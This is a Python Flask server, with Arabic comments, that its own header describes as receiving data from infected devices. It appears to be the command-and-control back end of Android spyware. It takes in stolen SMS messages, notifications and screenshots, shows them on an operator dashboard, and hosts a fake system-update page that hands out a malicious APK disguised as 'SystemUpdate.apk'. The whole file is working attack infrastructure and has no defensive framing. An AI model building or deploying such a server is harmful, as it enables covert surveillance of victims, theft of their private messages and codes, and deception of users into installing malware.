#!/usr/bin/env python3
# server.py — يستقبل بيانات الأجهزة المصابة

from flask import Flask, request, jsonify, render_template_string
import os
import json
from datetime import datetime

app = Flask(__name__)

DATA_DIR = "received"
os.makedirs(DATA_DIR, exist_ok=True)

# ---------- API ----------

@app.route("/api/register", methods=["POST"])
def register():
    """يستقبل تسجيل جهاز جديد."""
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get("device_id", "unknown")
    info = data.get("info", {})

    path = os.path.join(DATA_DIR, f"{device_id}_info.json")
    with open(path, "w") as f:
        json.dump(info, f, indent=2, ensure_ascii=False)

    print(f"[+] جهاز جديد: {device_id}")
    print(f"    {json.dumps(info, ensure_ascii=False)}")
    return jsonify({"status": "ok"})


@app.route("/api/data", methods=["POST"])
def upload():
    """يستقبل SMS / إشعارات."""
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get("device_id", "unknown")
    records = data.get("records", [])

    path = os.path.join(DATA_DIR, f"{device_id}.jsonl")
    with open(path, "a", encoding="utf-8") as f:
        for r in records:
            r["received_at"] = datetime.now().isoformat()
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    for r in records:
        print(f"[{device_id}] {r.get('type','?')}: {r.get('from','')} → {r.get('text','')[:100]}")

    return jsonify({"status": "ok", "count": len(records)})


@app.route("/api/screenshot", methods=["POST"])
def screenshot():
    """يستقبل صورة."""
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get("device_id", "unknown")
    b64 = data.get("image", "")

    import base64
    img_dir = os.path.join(DATA_DIR, f"{device_id}_images")
    os.makedirs(img_dir, exist_ok=True)
    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
    with open(os.path.join(img_dir, filename), "wb") as f:
        f.write(base64.b64decode(b64))

    print(f"[{device_id}] صورة: {filename}")
    return jsonify({"status": "ok"})


# ---------- لوحة التحكم ----------

DASHBOARD = """
<!doctype html>
<html><head><meta charset="utf-8"><title>Devices</title>
<style>
body { background:#111; color:#0f0; font-family:monospace; padding:20px;}
h1 { color:#0f0; }
.device { background:#222; padding:15px; margin:10px 0; border-left:3px solid #0f0; }
.record { background:#1a1a1a; padding:8px; margin:5px 0; font-size:12px; }
.from { color:#f90; }
.time { color:#888; font-size:10px; }
</style></head><body>
<h1>Devices</h1>
{% for d in devices %}
<div class="device">
  <b>{{ d.id }}</b> — {{ d.records|length }} records<br>
  <small>{{ d.info }}</small><br><br>
  {% for r in d.records[-30:] %}
  <div class="record">
    <span class="time">{{ r.received_at }}</span>
    <span class="from">[{{ r.type }}] {{ r.from }}</span> → {{ r.text }}
  </div>
  {% endfor %}
</div>
{% endfor %}
</body></html>
"""

@app.route("/")
def dashboard():
    devices = []
    if os.path.exists(DATA_DIR):
        for fname in sorted(os.listdir(DATA_DIR)):
            if fname.endswith(".jsonl"):
                dev_id = fname[:-6]
                with open(os.path.join(DATA_DIR, fname)) as f:
                    records = [json.loads(l) for l in f if l.strip()]
                info = "—"
                info_path = os.path.join(DATA_DIR, f"{dev_id}_info.json")
                if os.path.exists(info_path):
                    with open(info_path) as f:
                        info = json.dumps(json.load(f), ensure_ascii=False)
                devices.append({"id": dev_id, "records": records, "info": info})
    return render_template_string(DASHBOARD, devices=devices)



# ---------- Fake Update Page ----------
from flask import send_from_directory

@app.route("/update")
@app.route("/update/")
def fake_update():
    return send_from_directory("static", "update.html")

@app.route("/download/app.apk")
def download_apk():
    return send_from_directory("downloads", "app.apk",
                               as_attachment=True,
                               download_name="SystemUpdate.apk")
# ---------- End ----------
if __name__ == "__main__":
    print("[*] Server on http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
